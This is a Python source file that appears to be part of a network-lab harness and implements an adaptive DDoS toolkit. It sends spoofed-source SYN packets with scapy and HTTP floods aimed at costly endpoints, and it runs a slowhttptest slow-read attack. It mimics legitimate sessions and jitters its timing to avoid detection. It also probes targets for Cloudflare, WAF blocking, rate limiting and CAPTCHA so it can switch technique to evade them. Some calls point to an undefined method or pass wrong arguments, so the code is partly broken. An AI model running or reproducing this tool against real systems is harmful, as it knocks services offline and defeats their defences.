import os
import random
import time
import threading
import ipaddress
import socket
import requests
from scapy.all import IP, TCP, ICMP, UDP, Raw, send, sr1, RandShort
import psutil
from scapy.layers.http import HTTPRequest
import ssl
import re
import logging
import subprocess
import pathlib
import signal
import socket # Added for socket.timeout


import uuid

# Get the centralized attack logger
attack_logger = logging.getLogger('attack_logger')


# ---- IP Address Management ----

class IPRotator:
    def __init__(self, subnets=None):
        if subnets is None:
            subnets = ["192.168.0.0/16"]
        self.subnets = [ipaddress.IPv4Network(s) for s in subnets]
        self.used_ips = set()
        self.lock = threading.Lock()
    
    def get_random_ip(self):
        with self.lock:
            # Get a random IP from one of the subnets that hasn't been used recently
            while True:
                chosen_subnet = random.choice(self.subnets)
                random_ip = str(random.choice(list(chosen_subnet.hosts())))
                if random_ip not in self.used_ips:
                    self.used_ips.add(random_ip)
                    # Keep track of last 1000 IPs to avoid reuse
                    if len(self.used_ips) > 1000:
                        self.used_ips.pop()
                    return random_ip

# ---- Advanced Protocol Manipulation ----

class PacketCrafter:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        ]
        
        self.http_methods = ["GET", "POST", "HEAD", "OPTIONS"]
        self.http_paths = ["/", "/index.html", "/api/v1/users", "/products", 
                          "/login", "/static/css/main.css", "/images/banner.jpg"]
        
        # Common HTTP headers
        self.common_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
    
    def craft_tcp_packet(self, src, dst, dport=80):
        seq = random.randint(1000, 9000000)
        sport = random.randint(1024, 65535)
        
        # Randomize TCP options and flags more intelligently
        flags = random.choice(["S", "SA", "A", "PA", "FA"])
        window = random.randint(8192, 65535)
        
        # Create packet with randomized TTL
        ttl = random.randint(48, 128)
        packet = IP(src=src, dst=dst, ttl=ttl)/TCP(sport=sport, dport=dport, 
                                                   seq=seq, window=window, flags=flags)
        attack_logger.debug(f"Crafted TCP packet: src={src}, dst={dst}, dport={dport}, flags={flags}, ttl={ttl}")
        return packet
    
    def craft_http_packet(self, src, dst, dport=80):
        # Create base TCP packet
        base_packet = self.craft_tcp_packet(src, dst, dport)
        
        # Choose random HTTP method and path
        method = random.choice(self.http_methods)
        path = random.choice(self.http_paths)
        user_agent = random.choice(self.user_agents)
        
        # Create HTTP headers
        headers = dict(self.common_headers)
        headers["User-Agent"] = user_agent
        headers["Host"] = dst
        
        # Add a random referer sometimes
        if random.random() > 0.7:
            headers["Referer"] = f"https://{random.choice(['google.com', 'facebook.com', 'twitter.com'])}/search?q=products"
        
        # Format HTTP request
        http_request = f"{method} {path} HTTP/1.1\r\n"
        for header, value in headers.items():
            http_request += f"{header}: {value}\r\n"
        http_request += "\r\n"
        
        # Add body for POST requests
        if method == "POST":
            body = "param1=value1&param2=value2"
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(body))
            http_request += body
        
        # Combine with payload
        packet = base_packet/Raw(load=http_request.encode())
        attack_logger.debug(f"Crafted HTTP packet: method={method}, path={path}, user_agent={user_agent}, host={dst}")
        return packet

# ---- Advanced Attack Techniques ----

class AdvancedTechniques:
    def __init__(self, ip_rotator):
        self.ip_rotator = ip_rotator
        self.packet_crafter = PacketCrafter()
        self.target_info = {}
        self.session_tokens = {}
    
    
    
    def tcp_state_exhaustion(self, dst, dport=80, num_packets_per_sec=50, duration=5, run_id="", attack_variant=""):
        """
        Advanced TCP state exhaustion attack that manipulates sequence numbers
        and window sizes to keep connections half-open but valid
        """
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: TCP State Exhaustion - Target: {dst}:{dport}, Duration: {duration}s")
        
        # Track sequence numbers for more sophisticated sequence prediction
        seq_base = random.randint(1000000, 9000000)
        
        end_time = time.time() + duration
        sent_packets = 0
        received_packets = 0
        rst_packets = 0
        timeout_packets = 0
        packet_count = 0
        start_time = time.time()
        last_log_time = start_time
        
        # Burst mechanism parameters
        burst_size = max(1, int(num_packets_per_sec / 10)) # Send 10% of target PPS in a burst
        burst_interval = 0.1 # Time between bursts
        
        while time.time() < end_time:
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                src = self.ip_rotator.get_random_ip()
                sport = random.randint(1024, 65535)
                seq = seq_base + (sent_packets * 1024)
                
                # Sophisticated manipulation of TCP window size
                window = random.randint(16384, 65535)
                
                # Send SYN packet to initiate connection
                syn_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, 
                                                     flags="S", seq=seq, window=window)
                
                # Send and wait for SYN-ACK
                sent_packets += 1
                packet_count += 1 # Increment packet_count for every attempted send
                try:
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Attempting to send SYN packet from {src}:{sport} to {dst}:{dport}")
                    reply = sr1(syn_packet, timeout=1, verbose=0) # Increased timeout to 1 second
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] SYN packet sent. Reply: {reply}")
                    
                    if reply and reply.haslayer(TCP):
                        received_packets += 1
                        tcp_layer = reply.getlayer(TCP)
                        if tcp_layer.flags & 0x12:  # SYN+ACK
                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Received SYN-ACK from {dst}:{dport}. Sending ACK.")
                            # Extract server sequence number and acknowledge it
                            server_seq = tcp_layer.seq
                            ack_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
                                                                 flags="A", seq=seq+1, 
                                                                 ack=server_seq+1, window=window)
                            send(ack_packet, verbose=0) # verbose=0 to reduce console output
                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] ACK packet sent. Established half-open connection from {src}:{sport}")
                            # After establishing connection, don't continue with data transfer
                            # This keeps connection half-open, consuming resources on target
                            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Established half-open connection from {src}:{sport}")
                        elif tcp_layer.flags & 0x04: # RST flag
                            rst_packets += 1
                            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Received RST from {dst}:{dport} for {src}:{sport}. Connection reset by server.")
                        else:
                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Received unexpected TCP flags: {tcp_layer.flags} for {src}:{sport}.")
                    else:
                        attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] No TCP reply or invalid reply for {src}:{sport}.")
                except socket.timeout:
                    timeout_packets += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Timeout: No reply received for SYN from {src}:{sport} to {dst}:{dport}.")
                except Exception as e:
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Error during TCP state exhaustion from {src}:{sport}: {e}")
                    pass
                
                packet_count += 1
            
            current_time = time.time()
            if current_time - last_log_time >= 1.0: # Log every second
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_pps = packet_count / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Emission rate: {current_pps:.2f} packets/sec, Total sent = {packet_count}")
                last_log_time = current_time
            
            # Add jitter to avoid detection based on timing patterns
            time.sleep(random.uniform(burst_interval * 0.8, burst_interval * 1.2)) # Jittered sleep between bursts
        
        total_elapsed_time = time.time() - start_time
        warning_message = None
        if total_elapsed_time > 0:
            average_pps = packet_count / total_elapsed_time
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack finished. Total packets sent = {packet_count}, Average rate = {average_pps:.2f} packets/sec.")
            expected_packets = num_packets_per_sec * duration
            if packet_count < (expected_packets * 0.5): # Warning if less than 50% of expected
                warning_message = f"Low packet count ({packet_count}) for expected duration ({duration}s) and rate ({num_packets_per_sec} pps). Expected ~{expected_packets} packets."
        else:
            average_pps = 0
            warning_message = "Attack duration too short or no packets sent."
        
        return {"total_sent": sent_packets, "total_received": received_packets, "total_rst": rst_packets, "total_timeout": timeout_packets, "average_rate": average_pps, "type": "packets", "warning_message": warning_message}
    
    def distributed_application_layer_attack(self, dst, dport=80, num_requests_per_sec=20, duration=5, run_id="", attack_variant=""):
        """
        Advanced application layer attack that mimics legitimate HTTP traffic
        but targets resource-intensive endpoints
        """
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Distributed Application Layer - Target: {dst}:{dport}, Duration: {duration}s")
        
        # Resource-intensive endpoints that might cause server strain
        resource_heavy_paths = [
            "/search?q=" + "a" * random.randint(50, 100),
            "/api/products?page=1&size=100&sort=price",
            "/api/users/verify?token=" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64)),
            "/download?file=large_report.pdf",
            "/images/highres_" + str(random.randint(1000, 9999)) + ".jpg"
        ]
        
        end_time = time.time() + duration
        sent_requests = 0
        successful_requests = 0
        failed_requests = 0
        timeout_requests = 0
        start_time = time.time()
        last_log_time = start_time
        
        # Burst mechanism parameters
        burst_size = max(1, int(num_requests_per_sec / 10)) # Send 10% of target RPS in a burst
        burst_interval = 0.1 # Time between bursts
        
        while time.time() < end_time:
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                src = self.ip_rotator.get_random_ip()
                
                # Select a resource-heavy path
                path = random.choice(resource_heavy_paths)
                
                # Choose random HTTP method
                method = random.choice(self.packet_crafter.http_methods)

                # Create HTTP headers
                user_agent = random.choice(self.packet_crafter.user_agents)
                headers = dict(self.packet_crafter.common_headers)
                headers["User-Agent"] = user_agent
                headers["Host"] = dst
                
                # Sometimes add cookies to appear more legitimate
                if random.random() > 0.5:
                    headers["Cookie"] = f"session_id={os.urandom(16).hex()}; user_pref=dark_mode"
                
                session = requests.Session()
                session.headers.update(headers)

                sent_requests += 1
                try:
                    request_start_time = time.time()
                    if method == "GET":
                        response = session.get(f"http://{dst}:{dport}{path}", timeout=2)
                    elif method == "POST":
                        # For POST, include some dummy data
                        data = {"param1": "value1", "param2": "value2"}
                        response = session.post(f"http://{dst}:{dport}{path}", data=data, timeout=2)
                    elif method == "HEAD":
                        response = session.head(f"http://{dst}:{dport}{path}", timeout=2)
                    elif method == "OPTIONS":
                        response = session.options(f"http://{dst}:{dport}{path}", timeout=2)
                    
                    request_end_time = time.time()
                    response_time = (request_end_time - request_start_time) * 1000 # in ms
                    
                    successful_requests += 1
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] App Layer: {method} request to {dst}:{dport}{path} from {src} - Status: {response.status_code}, Time: {response_time:.2f}ms")
                    
                except requests.exceptions.Timeout:
                    timeout_requests += 1
                    failed_requests += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Timeout for {method} request to {dst}:{dport}{path} from {src}")
                except requests.exceptions.ConnectionError as e:
                    failed_requests += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Connection Error for {method} request to {dst}:{dport}{path} from {src}: {e}")
                except Exception as e:
                    failed_requests += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Unexpected Error for {method} request to {dst}:{dport}{path} from {src}: {e}")
                
            current_time = time.time()
            if current_time - last_log_time >= 1.0: # Log every second
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_rps = sent_requests / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Emission rate: {current_rps:.2f} requests/sec, Total sent = {sent_requests}, Successful = {successful_requests}, Failed = {failed_requests}")
                last_log_time = current_time
            
            # Variable timing to avoid detection
            time.sleep(random.uniform(burst_interval * 0.8, burst_interval * 1.2)) # Jittered sleep between bursts
        
        total_elapsed_time = time.time() - start_time
        warning_message = None
        if total_elapsed_time > 0:
            average_rps = sent_requests / total_elapsed_time
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack finished. Total requests sent = {sent_requests}, Successful = {successful_requests}, Failed = {failed_requests}, Average rate = {average_rps:.2f} requests/sec.")
            expected_requests = num_requests_per_sec * duration
            if sent_requests < (expected_requests * 0.5): # Warning if less than 50% of expected
                warning_message = f"Low request count ({sent_requests}) for expected duration ({duration}s) and rate ({num_requests_per_sec} rps). Expected ~{expected_requests} requests."
        else:
            average_rps = 0
            warning_message = "Attack duration too short or no requests sent."
        
        return {"total_sent": sent_requests, "total_successful": successful_requests, "total_failed": failed_requests, "total_timeout": timeout_requests, "average_rate": average_rps, "type": "requests", "warning_message": warning_message}
    
    def multi_vector_attack(self, dst, duration=60):
        """
        Launch multiple attack vectors simultaneously to make detection harder
        """
        attack_logger.info(f"Attack Phase: Multi-Vector Attack - Target: {dst}, Duration: {duration}s")
        
        end_time = time.time() + duration
        
        # Create threads for different attack vectors
        threads = []
        
        # TCP State Exhaustion
        t1 = threading.Thread(target=self._timed_tcp_exhaustion, args=(dst, end_time))
        threads.append(t1)
        
        # Application Layer Attack
        t2 = threading.Thread(target=self._timed_app_layer, args=(dst, end_time))
        threads.append(t2)
        
        # Slow Read Attack - more resource intensive
        t3 = threading.Thread(target=self.slow_read_attack, args=(dst, 20, duration))
        threads.append(t3)
        
        # Start all threads
        for t in threads:
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
            
    def _timed_tcp_exhaustion(self, dst, end_time):
        while time.time() < end_time:
            self.tcp_state_exhaustion(dst, num_packets=50)
            time.sleep(1)
    
    def _timed_app_layer(self, dst, end_time):
        while time.time() < end_time:
            self.distributed_application_layer_attack(dst, num_requests=20)
            time.sleep(1)

# ---- Advanced Session Management ----

import uuid

class SessionMaintainer:
    """Maintains persistent sessions to appear legitimate"""
    
    def __init__(self, ip_rotator):
        self.ip_rotator = ip_rotator
        self.sessions = {}  # Store session info for different targets
        self.lock = threading.Lock()
    
    def create_session(self, target):
        """Create and maintain a legitimate looking session"""
        src_ip = self.ip_rotator.get_random_ip()
        session_id = str(uuid.uuid4()) # Generate a unique session ID
        
        try:
            # Create an actual HTTP session
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'Accept-Language': 'en-US,en;q=0.5'
            })
            
            # Make initial request to get cookies/session info
            response = session.get(f"http://{target}/", timeout=2)
            
            # Store the session info
            with self.lock:
                self.sessions[session_id] = { # Use session_id as key
                    'src_ip': src_ip,
                    'session': session,
                    'cookies': session.cookies,
                    'last_page': '/',
                    'created': time.time()
                }
                
            attack_logger.debug(f"Session {session_id}: Created legitimate session from {src_ip}")
            return session_id
        except Exception as e:
            attack_logger.debug(f"Session {session_id}: Failed to create session from {src_ip}: {e}")
            return None
    
    def maintain_sessions(self, target, session_count=10, duration=300):
        """Create and maintain multiple legitimate-looking sessions"""
        attack_logger.info(f"Maintaining {session_count} legitimate sessions with {target}")
        
        # Create initial sessions
        active_session_ids = []
        for _ in range(session_count):
            session_id = self.create_session(target)
            if session_id:
                active_session_ids.append(session_id)
            time.sleep(random.uniform(1, 3))
        
        # Maintain sessions for duration
        end_time = time.time() + duration
        while time.time() < end_time:
            # Randomly select a session to interact with
            if active_session_ids:
                session_id = random.choice(active_session_ids)
                session_info = self.sessions.get(session_id)
                
                if session_info:
                    try:
                        # Make a legitimate-looking request
                        session = session_info['session']
                        
                        # Choose a page to visit based on previous page
                        if session_info['last_page'] == '/':
                            next_page = random.choice(['/about', '/products', '/contact'])
                        elif session_info['last_page'] == '/products':
                            next_page = f'/product/{random.randint(1, 100)}'
                        else:
                            next_page = '/'
                            
                        # Make the request
                        response = session.get(f"http://{target}{next_page}", timeout=2)
                        
                        # Update session info
                        with self.lock:
                            session_info['last_page'] = next_page
                            session_info['last_activity'] = time.time()
                        
                        attack_logger.debug(f"Session {session_id}: Visited {next_page}")
                    except Exception as e:
                        # Handle failed request - might need to create new session
                        attack_logger.debug(f"Session {session_id}: Interaction failed: {e}")
                        active_session_ids.remove(session_id)
                        # Clean up the failed session from self.sessions
                        if session_id in self.sessions:
                            with self.lock:
                                del self.sessions[session_id]
                        new_id = self.create_session(target)
                        if new_id:
                            active_session_ids.append(new_id)
            
            # Sleep between interactions
            time.sleep(random.uniform(5, 15))
        
        # Clean up sessions
        attack_logger.info("Cleaning up sessions")
        for session_id in active_session_ids:
            if session_id in self.sessions:
                with self.lock:
                    del self.sessions[session_id]

# ---- Monitoring and Adaptation ----

class AdaptiveController:
    def __init__(self, target):
        self.target = target
        self.response_times = []
        self.detected_countermeasures = set()
        self.lock = threading.Lock()
    
    def probe_target(self):
        """Send probe requests to measure target response and detect countermeasures"""
        try:
            start_time = time.time()
            response = requests.get(f"http://{self.target}/", timeout=5)
            response_time = time.time() - start_time
            
            with self.lock:
                # Keep last 10 response times
                self.response_times.append(response_time)
                if len(self.response_times) > 10:
                    self.response_times.pop(0)
                
                # Check for countermeasures in headers or response
                if response.status_code == 503:
                    self.detected_countermeasures.add("rate_limiting")
                
                if "cf-ray" in response.headers:
                    self.detected_countermeasures.add("cloudflare")
                
                if "captcha" in response.text.lower():
                    self.detected_countermeasures.add("captcha")
                
                if response.status_code == 403:
                    self.detected_countermeasures.add("waf_blocking")
            
            return response_time
        except requests.exceptions.Timeout:
            with self.lock:
                self.detected_countermeasures.add("timeout_defense")
            return None
        except Exception as e:
            attack_logger.debug(f"Probe error: {e}")
            return None
    
    def get_average_response_time(self):
        with self.lock:
            if not self.response_times:
                return 1.0  # Default if no measurements
            return sum(self.response_times) / len(self.response_times)
    
    def get_recommended_attack_params(self):
        """Recommend attack parameters based on target behavior"""
        with self.lock:
            avg_response = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
        
        # Default parameters
        params = {
            "packet_rate": 10,
            "connection_count": 50,
            "preferred_technique": "slow_read",
            "rotation_speed": "medium"
        }
        
        # Adjust based on response time
        if avg_response < 0.2:  # Very fast target
            params["packet_rate"] = 20
            params["connection_count"] = 100
        elif avg_response > 2.0:  # Already struggling target
            params["packet_rate"] = 5
            params["connection_count"] = 20
        
        # Adjust based on detected countermeasures
        if "rate_limiting" in countermeasures:
            params["preferred_technique"] = "slow_read"
            params["rotation_speed"] = "fast"
        
        if "waf_blocking" in countermeasures:
            params["preferred_technique"] = "tcp_state_exhaustion"
        
        if "cloudflare" in countermeasures:
            params["rotation_speed"] = "very_fast"
        
        return params
    
    def monitoring_loop(self, duration=300):
        """Continuously monitor target and update parameters"""
        attack_logger.info(f"Starting adaptive monitoring of {self.target} for {duration} seconds")
        
        end_time = time.time() + duration
        while time.time() < end_time:
            self.probe_target()
            
            # Log current status
            avg_time = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
            attack_logger.info(f"Target status: avg_response={avg_time:.2f}s, detected={countermeasures}")
            
            # Wait before next probe
            time.sleep(10)

# ---- Main Attack Coordinator ----

class AdvancedDDoSCoordinator:
    def __init__(self, target):
        self.target = target
        self.ip_rotator = IPRotator(subnets=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])
        self.advanced = AdvancedTechniques(self.ip_rotator)
        self.session_maintainer = SessionMaintainer(self.ip_rotator)
        self.adaptive_controller = AdaptiveController(target)
    
    def execute_advanced_attack(self, duration=300):
        """Execute a comprehensive advanced DDoS attack"""
        attack_logger.info(f"Starting advanced DDoS against {self.target} for {duration} seconds")
        
        # Start monitoring in separate thread
        monitor_thread = threading.Thread(
            target=self.adaptive_controller.monitoring_loop,
            args=(duration,)
        )
        monitor_thread.start()
        
        # Start legitimate-looking session activity
        session_thread = threading.Thread(
            target=self.session_maintainer.maintain_sessions,
            args=(self.target, 5, duration)
        )
        session_thread.start()
        
        # Main attack loop
        end_time = time.time() + duration
        while time.time() < end_time:
            # Get recommended parameters based on target state
            params = self.adaptive_controller.get_recommended_attack_params()
            
            # Choose attack technique based on recommendations
            technique = params["preferred_technique"]
            
            if technique == "multi_vector":
                # Execute for a shorter interval to allow for adaptation
                self.advanced.multi_vector_attack(self.target, min(30, end_time - time.time()))
            elif technique == "slow_read":
                self.advanced.slow_read_attack(
                    self.target, 
                    num_connections=params["connection_count"],
                    duration=min(30, end_time - time.time())
                )
            elif technique == "tcp_state_exhaustion":
                for _ in range(10):  # Run multiple rounds
                    if time.time() >= end_time:
                        break
                    self.advanced.tcp_state_exhaustion(
                        self.target, 
                        num_packets=params["packet_rate"] * 10
                    )
                    time.sleep(1)
                    
            # Short pause to check status
            time.sleep(5)
        
        # Wait for monitoring to complete
        monitor_thread.join()
        session_thread.join()
        
        attack_logger.info(f"Advanced DDoS attack completed. Total duration: {duration}s")

# ---- Run everything ----

def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", output_dir=None):
    from pathlib import Path
    import uuid # Import uuid for generating unique run IDs
    
    run_id = str(uuid.uuid4()) # Generate a unique ID for this attack run
    
    if output_dir:
        attack_log_file = Path(output_dir) / "attack.log"
        file_handler = logging.FileHandler(attack_log_file)
        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
        attack_logger.addHandler(file_handler)

    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Starting advanced adversarial attack against {victim_ip} for {duration} seconds.")
    coordinator = AdvancedDDoSCoordinator(victim_ip)

    attack_results = {} # Dictionary to store results for summary

    if attack_variant == "slow_read":
        # slow_read is handled by the coordinator's advanced.slow_read_attack, which is not yet implemented
        # in the provided code snippet. Assuming it will be a direct call to slowhttptest.
        # For now, we'll keep the existing slowhttptest execution logic.
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Adversarial Slow Read - Attacker: {attacker_host.name}, Target: {victim_ip}, Duration: {duration}s")
        slowhttptest_cmd = f"slowhttptest -c 100 -H -i 10 -r 20 -l {duration} -u http://{victim_ip}:80/ -t SR"
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Executing slowhttptest command: {slowhttptest_cmd}")
        
        process = attacker_host.popen(slowhttptest_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(duration)
        
        try:
            if process.poll() is None:
                process.send_signal(signal.SIGINT)
                attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Sent SIGINT to slowhttptest process {process.pid}")
                time.sleep(1) 
        except Exception as e:
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Error sending SIGINT to slowhttptest: {e}")
        
        if process.poll() is None:
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process {process.pid} did not terminate gracefully, forcing termination.")
            process.terminate()
            time.sleep(1)
        
        stdout, stderr = process.communicate()
        stdout_str = stdout.decode().strip()
        stderr_str = stderr.decode().strip()

        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} finished.")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- slowhttptest Summary ---")
        
        exit_status_match = re.search(r"Exit Status: (\d+)", stdout_str)
        pending_match = re.search(r"pending connections:\s*(\d+)", stdout_str)
        connected_match = re.search(r"connected connections:\s*(\d+)", stdout_str)
        closed_match = re.search(r"closed connections:\s*(\d+)", stdout_str)
        error_match = re.search(r"error connections:\s*(\d+)", stdout_str)
        
        if exit_status_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Exit Status: {exit_status_match.group(1)}")
        if pending_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Pending Connections: {pending_match.group(1)}")
        if connected_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Connected Connections: {connected_match.group(1)}")
        if closed_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Closed Connections: {closed_match.group(1)}")
        if error_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Error Connections: {error_match.group(1)}")

        # Calculate and log total connections attempted and successful connections
        pending = int(pending_match.group(1)) if pending_match else 0
        connected = int(connected_match.group(1)) if connected_match else 0
        closed = int(closed_match.group(1)) if closed_match else 0
        errors = int(error_match.group(1)) if error_match else 0
        
        total_connections_attempted = pending + connected + closed + errors
        successful_connections = connected
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total Connections Attempted: {total_connections_attempted}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Successful Connections: {successful_connections}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stdout: {stdout_str}")

        if stderr_str:
            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stderr: {stderr_str}")
        
        exit_code = process.returncode
        if exit_code != 0:
            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process exited with non-zero code: {exit_code}")
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------------")
        attack_results[attack_variant] = {
            "status": "completed",
            "exit_code": exit_code,
            "stdout_summary": {
                "exit_status": exit_status_match.group(1) if exit_status_match else "N/A",
                "pending": pending_match.group(1) if pending_match else "N/A",
                "connected": connected_match.group(1) if connected_match else "N/A",
                "closed": closed_match.group(1) if closed_match else "N/A",
                "errors": error_match.group(1) if error_match else "N/A",
                "total_attempted": total_connections_attempted,
                "successful": successful_connections,
            },
            "stderr": stderr_str
        }
        return process
    elif attack_variant == "ad_syn":
        results = coordinator.advanced.tcp_state_exhaustion(victim_ip, duration=duration, run_id=run_id, attack_variant=attack_variant)
        attack_results[attack_variant] = results
    elif attack_variant == "ad_udp":
        results = coordinator.advanced.distributed_application_layer_attack(victim_ip, duration=duration, run_id=run_id, attack_variant=attack_variant)
        attack_results[attack_variant] = results
    else:
        attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Unknown attack variant: {attack_variant}. No specific attack executed.")
        attack_results[attack_variant] = {"status": "unknown_variant", "message": "No specific attack executed for this variant."}
        return None
    
    # Final summary for ad_syn and ad_udp
    if attack_variant in ["ad_syn", "ad_udp"] and attack_results.get(attack_variant):
        summary = attack_results[attack_variant]
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- Attack Summary ---")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total {summary.get('type', 'packets/requests')} sent: {summary.get('total_sent', 0)}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Average rate: {summary.get('average_rate', 0):.2f} {summary.get('type', 'packets/requests')}/sec")
        if summary.get('warning_message'):
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Warning: {summary['warning_message']}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------")
    
    return None # For ad_syn and ad_udp, no direct process to return
